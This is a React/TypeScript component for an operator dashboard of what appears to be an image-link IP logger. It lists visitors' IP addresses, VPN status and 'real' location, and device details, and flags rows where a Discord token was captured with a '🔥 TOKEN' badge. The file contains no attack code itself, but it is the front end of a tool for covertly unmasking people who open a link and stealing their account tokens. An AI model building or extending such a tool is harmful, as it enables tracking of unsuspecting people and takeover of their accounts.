import { useQuery } from "@tanstack/react-query";
import { useState } from "react";
import { Search, Filter, ChevronLeft, ChevronRight } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Skeleton } from "@/components/ui/skeleton";

interface IpLog {
  id: string;
  ipAddress: string;
  userAgent: string;
  referrer: string;
  timestamp: string;
  location: string;
  status: string;
  isVpn?: string;
  vpnLocation?: string;
  realLocation?: string;
  deviceType?: string;
  browserName?: string;
  operatingSystem?: string;
  deviceBrand?: string;
}

interface LogsResponse {
  logs: IpLog[];
  total: number;
}

export default function LogTable() {
  const [currentPage, setCurrentPage] = useState(1);
  const [search, setSearch] = useState("");
  const logsPerPage = 10;

  const { data, isLoading } = useQuery<LogsResponse>({
    queryKey: ['/api/logs', { limit: logsPerPage, offset: (currentPage - 1) * logsPerPage }],
    refetchInterval: 2000, // Refetch every 2 seconds for faster updates
  });

  const filteredLogs = data?.logs.filter(log =>
    log.ipAddress.toLowerCase().includes(search.toLowerCase()) ||
    log.userAgent.toLowerCase().includes(search.toLowerCase()) ||
    log.location.toLowerCase().includes(search.toLowerCase()) ||
    (log.deviceType && log.deviceType.toLowerCase().includes(search.toLowerCase())) ||
    (log.browserName && log.browserName.toLowerCase().includes(search.toLowerCase())) ||
    (log.operatingSystem && log.operatingSystem.toLowerCase().includes(search.toLowerCase())) ||
    (log.deviceBrand && log.deviceBrand.toLowerCase().includes(search.toLowerCase()))
  ) || [];

  const totalPages = Math.ceil((data?.total || 0) / logsPerPage);

  const formatTimestamp = (timestamp: string) => {
    return new Date(timestamp).toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    });
  };

  const truncateUserAgent = (userAgent: string, maxLength: number = 60) => {
    return userAgent.length > maxLength ? userAgent.substring(0, maxLength) + '...' : userAgent;
  };

  if (isLoading) {
    return (
      <div className="bg-card rounded-lg border border-border">
        <div className="p-6 border-b border-border">
          <h3 className="text-lg font-semibold text-foreground">Recent Log Entries</h3>
        </div>
        <div className="p-6 space-y-4">
          {[...Array(5)].map((_, i) => (
            <Skeleton key={i} className="h-12 w-full" />
          ))}
        </div>
      </div>
    );
  }

  return (
    <div className="bg-card rounded-lg border border-border">
      <div className="p-6 border-b border-border">
        <div className="flex flex-col space-y-4 sm:flex-row sm:items-center sm:justify-between sm:space-y-0">
          <h3 className="text-lg font-semibold text-foreground">Recent Log Entries</h3>
          <div className="flex flex-col sm:flex-row items-stretch sm:items-center space-y-3 sm:space-y-0 sm:space-x-3">
            <div className="relative flex-1 sm:flex-none">
              <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input
                type="text"
                placeholder="Search logs..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="pl-10 w-full sm:w-64 bg-input border-border text-foreground placeholder-muted-foreground"
                data-testid="input-search-logs"
              />
            </div>
            <Button variant="secondary" className="bg-secondary text-secondary-foreground hover:bg-secondary/90 sm:flex-shrink-0 animate-button">
              <Filter className="mr-2 h-4 w-4" />
              Filter
            </Button>
          </div>
        </div>
      </div>

      <div className="overflow-x-auto">
        <table className="w-full min-w-[800px]">
          <thead className="bg-muted/50">
            <tr>
              <th className="p-3 sm:p-4 text-left text-sm font-medium text-muted-foreground">Timestamp</th>
              <th className="p-3 sm:p-4 text-left text-sm font-medium text-muted-foreground">IP & VPN</th>
              <th className="p-3 sm:p-4 text-left text-sm font-medium text-muted-foreground">Location</th>
              <th className="p-3 sm:p-4 text-left text-sm font-medium text-muted-foreground hidden sm:table-cell">Device Info</th>
              <th className="p-3 sm:p-4 text-left text-sm font-medium text-muted-foreground hidden md:table-cell">User Agent</th>
              <th className="p-3 sm:p-4 text-left text-sm font-medium text-muted-foreground">Status</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-border">
            {filteredLogs.length === 0 ? (
              <tr>
                <td colSpan={6} className="p-8 text-center text-muted-foreground">
                  No log entries found. Start by accessing /image.jpg to generate logs.
                </td>
              </tr>
            ) : (
              filteredLogs.map((log) => (
                <tr key={log.id} className="hover:bg-muted/20 transition-colors" data-testid={`row-log-${log.id}`}>
                  <td className="p-2 sm:p-4 text-xs sm:text-sm text-foreground" data-testid={`text-timestamp-${log.id}`}>
                    <div className="flex flex-col">
                      <span className="font-mono">{new Date(log.timestamp).toLocaleDateString()}</span>
                      <span className="text-xs text-muted-foreground">{new Date(log.timestamp).toLocaleTimeString()}</span>
                    </div>
                  </td>
                  <td className="p-2 sm:p-4" data-testid={`text-ip-${log.id}`}>
                    <div className="flex flex-col space-y-1">
                      <span className="text-xs sm:text-sm font-mono text-foreground break-all">{log.ipAddress}</span>
                      {log.isVpn === 'yes' ? (
                        <Badge variant="destructive" className="text-xs w-fit">
                          🛡️ VPN
                        </Badge>
                      ) : (
                        <Badge variant="outline" className="text-xs w-fit">
                          ✅ Direct
                        </Badge>
                      )}
                    </div>
                  </td>
                  <td className="p-2 sm:p-4 text-xs sm:text-sm text-foreground" data-testid={`text-location-${log.id}`}>
                    <div className="flex flex-col space-y-1">
                      <span className="font-medium">{log.location}</span>
                      {log.isVpn === 'yes' && log.realLocation && (
                        <span className="text-xs text-muted-foreground">Real: {log.realLocation}</span>
                      )}
                      <div className="sm:hidden flex flex-col space-y-1 text-xs text-muted-foreground pt-1">
                        <span>{log.deviceType || 'Unknown'} • {log.browserName || 'Unknown'}</span>
                        <span className="truncate max-w-[150px]" title={log.userAgent}>{truncateUserAgent(log.userAgent, 30)}</span>
                      </div>
                    </div>
                  </td>
                  <td className="p-2 sm:p-4 text-xs sm:text-sm hidden sm:table-cell" data-testid={`text-device-${log.id}`}>
                    <div className="flex flex-col space-y-1">
                      <div className="flex items-center space-x-2">
                        <span className="text-xs bg-secondary text-secondary-foreground px-2 py-1 rounded">
                          {log.deviceType || 'Unknown'}
                        </span>
                        <span className="text-xs text-muted-foreground">
                          {log.deviceBrand || 'Unknown'}
                        </span>
                      </div>
                      <div className="flex items-center space-x-2 text-xs text-muted-foreground">
                        <span>{log.operatingSystem || 'Unknown'}</span>
                        <span>•</span>
                        <span>{log.browserName || 'Unknown'}</span>
                      </div>
                    </div>
                  </td>
                  <td className="p-2 sm:p-4 text-xs sm:text-sm max-w-xs truncate text-foreground hidden md:table-cell" data-testid={`text-user-agent-${log.id}`}>
                    <span title={log.userAgent}>{truncateUserAgent(log.userAgent, 40)}</span>
                  </td>
                  <td className="p-2 sm:p-4" data-testid={`status-${log.id}`}>
                    <Badge
                      variant={log.status === 'success' ? 'default' :
                              log.status === 'discord_token_captured' ? 'destructive' : 'secondary'}
                      className="text-xs"
                    >
                      {log.status === 'discord_token_captured' ? '🔥 TOKEN' : log.status}
                    </Badge>
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>

      <div className="p-3 sm:p-4 border-t border-border flex flex-col sm:flex-row items-center justify-between space-y-3 sm:space-y-0">
        <p className="text-xs sm:text-sm text-muted-foreground text-center sm:text-left">
          Showing {Math.min((currentPage - 1) * logsPerPage + 1, data?.total || 0)}-{Math.min(currentPage * logsPerPage, data?.total || 0)} of {data?.total || 0} entries
        </p>
        <div className="flex items-center space-x-1 sm:space-x-2">
          <Button
            variant="outline"
            size="sm"
            onClick={() => setCurrentPage(prev => Math.max(1, prev - 1))}
            disabled={currentPage === 1 || !data?.total}
            className="border-border animate-button"
            data-testid="button-previous-page"
          >
            <ChevronLeft className="h-4 w-4" />
            Previous
          </Button>

          <div className="flex items-center space-x-1">
            {[...Array(Math.min(5, totalPages))].map((_, i) => {
              const pageNum = i + 1;
              return (
                <Button
                  key={pageNum}
                  variant={currentPage === pageNum ? "default" : "outline"}
                  size="sm"
                  onClick={() => setCurrentPage(pageNum)}
                  className={currentPage === pageNum
                    ? "bg-primary text-primary-foreground animate-button"
                    : "border-border animate-button"
                  }
                  data-testid={`button-page-${pageNum}`}
                >
                  {pageNum}
                </Button>
              );
            })}
          </div>

          <Button
            variant="outline"
            size="sm"
            onClick={() => setCurrentPage(prev => Math.min(totalPages, prev + 1))}
            disabled={currentPage === totalPages || !data?.total}
            className="border-border animate-button"
            data-testid="button-next-page"
          >
            Next
            <ChevronRight className="h-4 w-4" />
          </Button>
        </div>
      </div>
    </div>
  );
}